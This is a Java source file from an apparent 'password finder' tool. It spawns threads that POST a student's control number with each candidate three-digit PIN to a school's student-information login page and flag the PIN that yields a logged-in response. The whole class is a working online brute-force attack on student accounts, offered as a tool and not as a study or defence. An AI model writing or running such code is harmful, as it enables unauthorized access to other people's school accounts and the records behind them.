package sii;

import java.awt.Toolkit;
import java.net.HttpURLConnection;
import java.net.UnknownHostException;

import javax.swing.JOptionPane;
import serverComm.ServerConn;

/** 	This class creates a new connection to the specified url and posts the student parameters
 * to test if they are correct. In case the parameters are correct, it saves the NIP found
 * else it just stops.
 * @author Skeleton	 */
class TestPass extends Thread{

	public final String msj_usr = "usuario", msj_pws = "contrasena", msj_tipo = "tipo=a";
	public int pass;
	public String urlInstituto,numeroControl;
	public BasePassFinder mCallback;
	private boolean setExit = false;
	public void run(){
		try{
			String response= null;
			HttpURLConnection con = null;
			con= ServerConn.Connect(ServerConn.metPOST,urlInstituto,
					String.format("%s=%s&%s=%03d&%s",msj_usr, numeroControl, msj_pws, pass, msj_tipo));
			response = ServerConn.getResponse(con);
			//System.out.println(pass+"-"+response);
			if(response.indexOf("modulos/alu")!= -1){
				mCallback.setNIPfound(pass,true);
			}
		}catch(UnknownHostException uhe){
			BasePassFinder.searching = false;
			System.out.println("The url for the institute isn't correct, the System will stop");
			if(BasePassFinder.useSwing){
				BasePassFinder.useSwing = false;//prevent new messages to appear
				JOptionPane.showMessageDialog(null,"No se pudo conectar al servidor: \n" +
						urlInstituto+"\nEnvie un correo a miichaeld@outlook.com comentando este problema");
			}
			exitApp();

		}catch(Exception e){
			System.out.println("\tnew Timeout: "+ ++mCallback.timeout);

			e.printStackTrace();
			System.out.println(e.getCause());
			if(mCallback.timeout > 100){
				BasePassFinder.searching = false;
				System.out.println("Connection ERROR: "+ e.getMessage());
				if(BasePassFinder.useSwing){
					JOptionPane.showMessageDialog(null,"Error de Conexión,\nverifique su conexión a internet");
					BasePassFinder.useSwing = false;//prevent new messages to appear
				}
				exitApp();
			}
		}
	}

	public synchronized void exitApp(){
		if(!setExit){
		setExit = true;
		new Thread(new Runnable(){
			public void run(){
				Toolkit.getDefaultToolkit().beep();
				try {Thread.sleep(10000);} catch (InterruptedException e) {}
				System.exit(0);
			}
		}).start();
		}
	}

	/** 	This method creates a new thread to test the specified NIP
	 * @param pw is the NIP to be tested
	 * @param url The institute url to try the password
	 * @param nc is the student control number */
	public static void tryPW(int pw, String url, String nc, BasePassFinder callback){
		TestPass t1 = new TestPass();
		t1.pass = pw;
		t1.urlInstituto=url;
		t1.numeroControl=nc;
		t1.mCallback = callback;
		t1.start();
		if(pw % 100 == 0)
			System.out.printf("%04d%n",	pw);
	}
}